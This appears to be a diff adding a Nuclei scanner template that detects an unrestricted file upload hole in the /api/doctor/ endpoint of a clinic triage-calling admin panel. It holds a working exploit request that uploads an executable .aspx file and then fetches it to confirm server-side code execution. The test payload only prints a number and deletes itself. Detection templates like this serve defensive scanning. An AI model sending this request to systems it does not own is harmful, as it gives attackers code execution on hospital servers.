@@ -1,0 +1,71 @@
+id: china-shine-fzjhht-upload
+
+info:
+  name: china-shine 分诊叫号后台 - File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    This template detects unrestricted file upload vulnerabilities in the /api/doctor/ endpoint by attempting to upload a file with server-side executable content.
+  tags: china-shine-分诊叫号后台
+
+http:
+  - raw:
+      - |
+        POST /api/doctor/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Connection: close
+
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="doctorid"
+
+        0
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="login_id"
+
+        {{randstr}}.aspx
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="name"
+
+        22
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="title"
+
+        23
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="department"
+
+        24
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="description"
+
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+        Content-Disposition: form-data; name="icon"; filename="11.aspx"
+        Content-Type: text/aspx
+
+        <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+        ------WebKitFormBoundaryKZ5OA1LLddPA4mKc--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'success":true'
+
+  - raw:
+      - |
+        GET /Web/images/{{randstr}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "12321"
+      
